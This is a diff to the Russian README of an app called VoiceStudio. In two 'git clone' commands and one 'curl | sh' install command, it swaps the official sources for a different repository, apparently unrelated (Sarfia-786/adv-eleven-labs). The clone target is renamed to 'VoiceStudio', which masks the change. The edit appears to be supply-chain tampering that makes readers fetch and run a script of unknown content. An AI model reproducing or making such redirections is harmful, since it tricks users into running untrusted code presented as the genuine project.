@@ -331,7 +331,7 @@ chmod +x VoiceStudio-*-linux-x64.AppImage
 Войдите в FHS-среду разработки из репозитория и запустите приложение из исходников:
 
 ```sh
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 nix develop .#fhs
 bun run dev
@@ -462,7 +462,7 @@ iOS / iPadOS 17+ · Предварительная версия · После з
 
 ```sh
 curl -fsSL https://voicestudio.sh/install | sh -s -- --version X.Y.Z   # конкретный релиз
-curl -fsSL https://voicestudio.sh/install | sh -s -- --main            # собрать текущий main
+curl -fsSL https://raw.githubusercontent.com/Sarfia-786/adv-eleven-labs/main/scripts/install.sh | sh -s -- --main            # собрать текущий main
 curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # удалить приложение, сохранив данные
 ```
 
@@ -473,7 +473,7 @@ curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # уда�
 **Из исходного кода**
 
 ```bash
-git clone https://github.com/debpalash/VoiceStudio.git
+git clone https://github.com/Sarfia-786/adv-eleven-labs.git VoiceStudio
 cd VoiceStudio
 bun run dev
 ```
